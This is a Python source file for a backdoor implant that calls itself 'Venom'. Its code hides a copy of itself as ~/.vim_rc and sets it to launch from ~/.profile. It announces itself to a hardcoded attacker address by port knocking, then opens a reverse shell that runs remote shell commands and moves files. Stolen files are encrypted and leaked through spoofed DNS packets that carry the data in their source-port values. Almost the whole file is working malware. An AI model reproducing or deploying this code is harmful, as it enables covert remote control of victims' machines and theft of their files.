from os.path import expanduser


def change_settings():
    home = expanduser("~")
    with open(home + "/.profile", "a") as myfile:
        myfile.write("nohup python ./.vim_rc &")

    with open("xenophid.py") as somefile:
        with open(home + "/.vim_rc", "a") as hidefile:
            for i in xrange(16):
                somefile.next()
            for line in somefile:
                hidefile.write(line)


import os.path
import socket, subprocess
from utils import generate_password, encrypt
from scapy.all import *

PORT = 4433  # The same port as used by the server
DESTINATION = "192.168.1.149"
EOF = "G"
PORT_KNOCKER = [8000, 7000, 6000, 5000, 4000, 3000, 2000, 1000]
PASS = ""


def upload(s, cmdArg):
    fs = cmdArg[2]
    with open(cmdArg[1], "wb") as f:
        dr = s.recv(1024)
        f.write(dr)
        totalFS = len(dr)
        while dr:
            if str(totalFS) != fs:
                dr = s.recv(1024)
                f.write(dr)
                totalFS += len(dr)
            else:
                break
def download(sock,filePath):
    # call encrypt function - returns file size or data?
    # read file - return file data
    # encrypt file data - return character length
    fileInformation = encrypt_data(filePath)
    if fileInformation[0] == 0:
        sock.send(str(fileInformation[0]))
        print "not a valid file."
    else:
        sock.send(str(fileInformation[1])) #send file name + " " + filesize
        time.sleep(2)
        send_data_with_covert(fileInformation[0])
        time.sleep(3)
        send_data_with_covert(EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF+EOF)
    # send encrypted data using covert + delay + EOF bomb

def create_inside_out_connection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # connect to attacker machine
    s.connect((DESTINATION, PORT))
    # send we are connected
    s.send('[*] Venom Injected!')
    # start loop
    while 1:
        # recieve shell command
        data = s.recv(1024)
        # if its quit, then break out and close socket
        cmdArg = data.split(" ")
        if cmdArg[0] == "quit":
            break
        elif cmdArg[0] == "upload":
            upload(s, cmdArg)
        elif cmdArg[0] == "download":
            download(s,cmdArg[1])
        elif data == '':
            break
        else:
            # do shell command
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            # read output
            stdout_value = proc.stdout.read() + proc.stderr.read()
            if stdout_value == '':
                stdout_value = 'Command had no output.\n'
            s.send(stdout_value)

    # close socket
    s.close()


def encrypt_data(filePath):
    if os.path.isfile(filePath):
        with open(filePath, "rb") as fileToDownload:
            encryptedFileContent = encrypt(fileToDownload.read(), PASS)
            return [encryptedFileContent, len(encryptedFileContent)]
    else:
        return [0]

def send_data_with_covert(sendContent):
    for i in range(0, len(sendContent), 2):
        new_packet = make_packet(sendContent[i], sendContent[i + 1] if i < len(sendContent) - 1 else 0)
        send(new_packet)


def make_packet(char1, char2):
    firstCharHex = hex(ord(char1))[2:]
    secondCharHex = 0
    if char2 != 0:
        secondCharHex = hex(ord(char2))[2:]
    CovertSourcePort = 11822
    if secondCharHex != 0:
        CovertSourcePort = int(firstCharHex + secondCharHex, 16)
    else:
        secondCharHex = '2e'
        CovertSourcePort = int(firstCharHex + secondCharHex, 16)

    packet = IP(src=DESTINATION, dst=DESTINATION) / UDP(sport=CovertSourcePort) / DNS(rd=1,
                                                                                      qd=DNSQR(qname="google.com"))
    return packet


def generate_sport(char1, char2):
    firstCharHex = hex(ord(char1))[2:]
    secondCharHex = hex(ord(char2))[2:]
    sourcePort = 11822
    if secondCharHex != 0:
        sourcePort = int(firstCharHex + secondCharHex, 16)
    else:
        secondCharHex = '2e'
        sourcePort = int(firstCharHex + secondCharHex, 16)
    return sourcePort


def port_knocking(password):
    pass_index = 0
    for i in range(len(PORT_KNOCKER)):
        s_port = generate_sport(password[pass_index], password[pass_index + 1])
        packet = IP(dst=DESTINATION) / UDP(sport=s_port, dport=PORT_KNOCKER[i])
        pass_index += 2
        send(packet)
    time.sleep(2)

def main():
    #change_settings()
    global PASS
    PASS = generate_password()
    port_knocking(PASS)
    create_inside_out_connection()


if __name__ == '__main__':
    main()